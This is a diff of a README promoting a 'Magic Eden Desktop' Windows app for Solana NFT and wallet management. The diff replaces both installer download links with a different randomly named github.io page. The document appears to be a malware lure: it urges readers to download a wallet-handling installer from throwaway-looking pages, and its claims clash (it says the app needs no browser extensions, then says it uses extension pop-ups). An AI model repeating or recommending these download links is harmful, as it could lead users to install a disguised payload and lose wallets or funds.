@@ -2,7 +2,7 @@
 
 Magic Eden Desktop is a comprehensive, native Windows application designed to be your all-in-one command center for the Solana NFT ecosystem. This 2026 edition provides powerful tools for portfolio tracking, marketplace analytics, and efficient wallet management, all without the need for browser extensions or risky third-party hacks.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer%20(2026)-brightgreen?style=for-the-badge&logo=windows)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer%20(2026)-brightgreen?style=for-the-badge&logo=windows)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -52,7 +52,7 @@ A5: No. The application interacts with your wallet via browser extension pop-ups
 
 Get the latest stable release (v15.07, Updated June 2026) directly from our GitHub page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
